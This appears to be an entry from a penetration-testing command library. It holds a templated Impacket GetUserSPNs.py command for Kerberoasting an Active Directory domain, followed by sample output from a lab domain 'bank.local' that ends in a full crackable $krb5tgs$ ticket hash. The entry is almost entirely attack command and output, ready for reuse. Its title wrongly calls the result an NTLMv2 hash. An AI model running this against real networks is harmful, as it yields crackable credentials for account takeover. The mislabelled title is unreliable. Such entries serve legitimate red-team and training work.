---
id: 60be6f37-a881-46c8-a040-54b68d209734
name: GetUserSPN.py Query Domain for SPNs and Retrieve a User's NTLMv2 Hash
type: command
executor: ''
data: GetUserSPNs.py '$_DOMAIN/$_USERNAME:$_PASSWORD' -dc-ip $_DOMAIN_IP -request
  -request-user $_TARGET_USER
output: "root@kali:~# GetUserSPNs.py 'bank.local/bob:secretpass' -dc-ip 10.10.10.5\
  \ -request -request-user steve\nImpacket v0.9.22.dev1+20200428.191254.96c7a512 -\
  \ Copyright 2020 SecureAuth Corporation\n\nServicePrincipalName  Name   MemberOf\
  \  PasswordLastSet             LastLogon                   Delegation \n--------------------\
  \  -----  --------  --------------------------  --------------------------  ----------\n\
  nonexistent/bank      steve            2020-06-25 16:29:29.612157  2020-06-25 16:30:37.127975\
  \             \n\n\n\n$krb5tgs$23$*steve$BANK.LOCAL$nonexistent/bank*$9621969cc33159dec22e839a2cf74367$5013c37bfad1b7a3f3331ae6369edc3a3426fe783e4cb857a5b664641fae1489925082d3dbb7af50fbcc8e965a62104d1255c59be46376659f9e3290b717fe51f7884d96cb8ba6fcb725c3ad45086e773a0291330ae520dd51c2988536567ec2964a0bc619d7e9ee5907b3b347a0b14cb9ce387a5080e15bb3083bbce2c438b38b6a36ba0c8b68115f8694a42ead319ff949835fa39683c63129591a0cb7f962de1e7141c77b5c9b2153d430f74c91bd9cf048039c0d70e050bb35aa13e8ff55bb7367196eeba985b0ace743f046104381402add54d0823f20ef43097783fc2a0e0dd0cd07439438fa96da73f002846f7732c74083de88e04c9af7bbf85f2818d0f18671e03f7a7283baf14b296b4e73703db220b5f47b71deeb3baad1b9770cc59b74d663cd723e4d3fdce6c296a212e3be868db8cd655eda4d21562102ed497d76e6528e6a55c2ef3e37d17b6df9e0ec4caf3991576bc39b2f48a6c01b461ea1d0337ba6329b9cf0e9e25cefd7ebeeeba8e4913290d8c13555aa460fc76d97b26a5a48df70fe03d0f4cbf77bf71bf9713034450b672320e79f52957ae59a23576717a76c62bfce6e86969853562025a9b248b1c0931e57d93366267fe89a968b6d6850846030ea4a121daefc2d2dad06f94450e43bdce43f084291a9e76c87cb4a6a4b692836398c12d96c6e0b9e9496086e1d18312472cf23f3c943d3234b690e99b071a5575502ae85e0e9e2e779f9b916a131ba4e7dfd48f48d2cdcc51a8fd5eaee53df958a964dcb5ebe16c3b02fed31fa208809834d2e89b86ba9e4a5faee2e2336450b8d554e07a2ef776252043ca6ab4a4603b7e47cefee1a52f59d2839d9553b7469a11238267479d76e7e69d2ed56fd555366477178c764f6c62da63e96ac6eacdc281269f50f02c77687fdfb28bedba695238d4230ed868871c76dff970069ddba6d438253d0c99452c590282e97a9b0bbe80c05c8f9f4233aecf1c7936e3f4c70b77c118fbbc5ad712b32ad2d37b5248679464163049480d08bbcce224231cf908a200cd83f74aa8ad76eef4ccc57062a13862540a6dde265db381c18f1a14b63df276a76de20e328c9923de84d95f4486755eda26f7251630ee0cf16db847814e1f0d92556a7b40b0ef0a174f3ca89fd3227e45e196d34fd9cf51fdf192f8f1f089c27d5d0fed1d91475f623cef63f2339c429795f06a5e4f11f2c0da471a03b1523df246f0b8f7115b26a97309a66c705"
created_at: '2020-06-25T20:16:48.076670+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# GetUserSPN.py Query Domain for SPNs and Retrieve a User's NTLMv2 Hash

```bash
GetUserSPNs.py '$_DOMAIN/$_USERNAME:$_PASSWORD' -dc-ip $_DOMAIN_IP -request -request-user $_TARGET_USER
```

## Expected Output

```
root@kali:~# GetUserSPNs.py 'bank.local/bob:secretpass' -dc-ip 10.10.10.5 -request -request-user steve
Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name   MemberOf  PasswordLastSet             LastLogon                   Delegation 
--------------------  -----  --------  --------------------------  --------------------------  ----------
nonexistent/bank      steve            2020-06-25 16:29:29.612157  2020-06-25 16:30:37.127975             



$krb5tgs$23$*steve$BANK.LOCAL$nonexistent/bank*$9621969cc33159dec22e839a2cf74367$5013c37bfad1b7a3f3331ae6369edc3a3426fe783e4cb857a5b664641fae1489925082d3dbb7af50fbcc8e965a62104d1255c59be46376659f9e3290b717fe51f7884d96cb8ba6fcb725c3ad45086e773a0291330ae520dd51c2988536567ec2964a0bc619d7e9ee5907b3b347a0b14cb9ce387a5080e15bb3083bbce2c438b38b6a36ba0c8b68115f8694a42ead319ff949835fa39683c63129591a0cb7f962de1e7141c77b5c9b2153d430f74c91bd9cf048039c0d70e050bb35aa13e8ff55bb7367196eeba985b0ace743f046104381402add54d0823f20ef43097783fc2a0e0dd0cd07439438fa96da73f002846f7732c74083de88e04c9af7bbf85f2818d0f18671e03f7a7283baf14b296b4e73703db220b5f47b71deeb3baad1b9770cc59b74d663cd723e4d3fdce6c296a212e3be868db8cd655eda4d21562102ed497d76e6528e6a55c2ef3e37d17b6df9e0ec4caf3991576bc39b2f48a6c01b461ea1d0337ba6329b9cf0e9e25cefd7ebeeeba8e4913290d8c13555aa460fc76d97b26a5a48df70fe03d0f4cbf77bf71bf9713034450b672320e79f52957ae59a23576717a76c62bfce6e86969853562025a9b248b1c0931e57d93366267fe89a968b6d6850846030ea4a121daefc2d2dad06f94450e43bdce43f084291a9e76c87cb4a6a4b692836398c12d96c6e0b9e9496086e1d18312472cf23f3c943d3234b690e99b071a5575502ae85e0e9e2e779f9b916a131ba4e7dfd48f48d2cdcc51a8fd5eaee53df958a964dcb5ebe16c3b02fed31fa208809834d2e89b86ba9e4a5faee2e2336450b8d554e07a2ef776252043ca6ab4a4603b7e47cefee1a52f59d2839d9553b7469a11238267479d76e7e69d2ed56fd555366477178c764f6c62da63e96ac6eacdc281269f50f02c77687fdfb28bedba695238d4230ed868871c76dff970069ddba6d438253d0c99452c590282e97a9b0bbe80c05c8f9f4233aecf1c7936e3f4c70b77c118fbbc5ad712b32ad2d37b5248679464163049480d08bbcce224231cf908a200cd83f74aa8ad76eef4ccc57062a13862540a6dde265db381c18f1a14b63df276a76de20e328c9923de84d95f4486755eda26f7251630ee0cf16db847814e1f0d92556a7b40b0ef0a174f3ca89fd3227e45e196d34fd9cf51fdf192f8f1f089c27d5d0fed1d91475f623cef63f2339c429795f06a5e4f11f2c0da471a03b1523df246f0b8f7115b26a97309a66c705
```


